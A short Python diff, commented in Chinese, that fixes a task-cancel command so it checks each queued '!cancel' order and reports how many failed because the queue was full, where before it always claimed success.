@@ -25,9 +25,18 @@ def run(disp, args):
         targets = list(getattr(rec, "running_tasks", []) or [])
     if not targets:
         return "[!] 无运行中任务(task_id 列表见 tasks 命令)"
-    n = 0
+    ok = 0
+    failed = []
     for tid in targets:
         task = Task(code=f"!cancel {tid}")
-        disp.push_task(bid, task)
-        n += 1
-    return f"[+] 已下发 {n} 条终止指令 → {bid}: {', '.join(targets)}"
+        # R31:push_task 队列满时返回 "[!] ..." —— 此前丢弃返回值一律报「已下发 N 条」,
+        # 操作者以为已终止实际一条没发
+        msg = disp.push_task(bid, task)
+        if isinstance(msg, str) and msg.startswith("[+]"):
+            ok += 1
+        else:
+            failed.append(tid)
+    if failed:
+        return (f"[!] 终止指令下发 {ok}/{len(targets)} 成功,{len(failed)} 条入队失败"
+                f"(任务队列已满):{', '.join(failed)}")
+    return f"[+] 已下发 {ok} 条终止指令 → {bid}: {', '.join(targets)}"
